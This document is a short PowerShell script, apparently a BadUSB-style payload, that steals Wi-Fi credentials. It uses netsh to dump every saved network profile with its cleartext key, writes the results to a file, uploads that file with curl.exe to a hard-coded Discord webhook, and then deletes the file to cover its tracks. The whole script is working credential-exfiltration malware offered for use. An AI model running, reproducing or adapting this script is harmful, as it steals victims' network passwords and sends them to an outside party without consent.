﻿#exfiltrate wifi credentials to webhook

#webhook
$webhook = "https://discord.com/api/webhooks/1108311287508783197/3O9i2lf9xsbisdKSfiKisGSNa5vCNIN0NW3j0iiJFeT9yDuPChueJXJ4gdYvTcYL3Xw4"

#get wifi creds
$creds = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String

#save wifi creds
Add-Content -Path WifiCreds-$env:UserName.txt -Value $creds

#send Creds


curl.exe -F "payload_json={\`"username\`": \`"$env:UserName\`", \`"content\`": \`"\`"}" -F "file=@WifiCreds-$env:UserName.txt" $webhook

#remove
Remove-Item -Path WifiCreds-$env:UserName.txt
exit
